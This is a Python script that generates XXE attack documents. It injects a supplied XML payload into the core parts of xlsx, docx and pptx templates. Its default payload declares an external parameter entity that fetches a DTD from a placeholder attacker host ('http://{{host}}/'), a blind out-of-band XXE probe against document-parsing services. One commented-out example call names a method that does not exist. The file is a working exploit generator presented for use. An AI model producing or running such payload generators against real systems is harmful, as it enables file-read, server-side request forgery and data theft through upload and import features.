import os
import tempfile
import zipfile

# .docx 
# .pdf  
# .md   
# .fods 
# .odg  
# .odp  
# .ods  
# .ots  
# .pptx 
# .svg  
# .xlsx 
# .xml  
# .odt  
# .jpg  
# .gif 


def updateZip(zipname, filename, content='', output=''):
    dirname = os.path.dirname(output)
    if not os.path.isdir(dirname):
        os.makedirs(dirname)

    with zipfile.ZipFile(zipname) as zin:
        with zipfile.ZipFile(output, 'w') as zout:
            for item in zin.infolist():
                if item.filename not in filename:
                    zout.writestr(item, zin.read(item.filename))

    with zipfile.ZipFile(output, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
        for f in filename:
            zf.writestr(f, content)

    return True



class Payload():
    
    def __init__(self, payload, dirname=os.path.abspath(os.path.join(os.path.dirname(__file__), 'tmp'))):
        self.payload = payload
        self.dirname = dirname
        self.template_path = os.path.join(os.path.dirname(__file__), 'samples')
        self.xlsx_template = os.path.join(self.template_path, 'sample.xlsx')
        self.doc_template = os.path.join(self.template_path, 'sample.docx')
        self.pptx_template = os.path.join(self.template_path, 'sample.pptx')
    # xlsx
    def xlsx_poc(self):
        new_filename = tempfile.mktemp(suffix=os.path.splitext(self.xlsx_template)[1], dir=self.dirname)
        filename = ['_rels/.rels', '[Content_Types].xml', 'xl/workbook.xml']
        if updateZip(self.xlsx_template, filename, self.payload, new_filename):
            return new_filename

    # Word
    def doc_poc(self):
        new_filename = tempfile.mktemp(suffix=os.path.splitext(self.doc_template)[1], dir=self.dirname)
        filename = ['_rels/.rels', '[Content_Types].xml', 'word/document.xml']
        if updateZip(self.doc_template, filename, self.payload, new_filename):
            return new_filename
    # pptx
    def pptx_poc(self):
        new_filename = tempfile.mktemp(suffix=os.path.splitext(self.pptx_template)[1], dir=self.dirname)
        filename = ['_rels/.rels', '[Content_Types].xml', 'ppt/presentation.xml']
        if updateZip(self.pptx_template, filename, self.payload, new_filename):
            return new_filename

if __name__ == '__main__':
    payload = '''<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://{{host}}/">
%remote;
]>'''
    # gen = Payload(payload)
    # gen.xlsx_poc()
    # gen.word_poc()
    # gen.pptx_poc()